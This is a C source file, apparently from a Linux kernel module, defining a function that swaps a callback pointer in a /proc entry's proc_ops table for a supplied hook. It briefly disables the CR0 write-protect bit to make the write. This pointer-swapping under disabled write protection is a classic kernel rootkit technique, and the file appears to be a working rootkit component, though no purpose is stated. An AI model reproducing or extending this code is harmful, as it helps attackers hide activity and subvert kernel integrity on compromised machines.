#include <linux/container_of.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/stddef.h>
#include <linux/version.h>

#include "cr0.h"
#include "hook.h"

// swaps callback pointer and returns old pointer
// DO NOT EVER CALL THIS FUNCTION WITH A NON-PROC PATH!
void *
hook_proc (char *path, unsigned long member, void *hook)
{
  struct __proc_dir_entry *de;
  struct inode *node;
  struct path file;
  void *old;
  char *tmp;

  if (0 > kern_path (path, LOOKUP_FOLLOW, &file))
    {
      return NULL;
    }

  if (NULL == file.dentry)
    {
      return NULL;
    }

  if (NULL == file.dentry->d_inode)
    {
      return NULL;
    }

  node = file.dentry->d_inode;

  de = (struct __proc_dir_entry *)container_of (node, struct __proc_inode,
                                                vfs_inode)->pde;

  if (NULL == de)
    {
      return NULL;
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
  tmp = (char *)de->proc_ops;
#else
  tmp = (char *)de->proc_dir_ops;
#endif

  if (NULL == tmp)
    {
      return NULL;
    }

  old = *(void **)&tmp[member];
  DISABLE_WP_CR0 ();
  *(void **)&tmp[member] = hook;
  ENABLE_WP_CR0 ();

  return old;
}
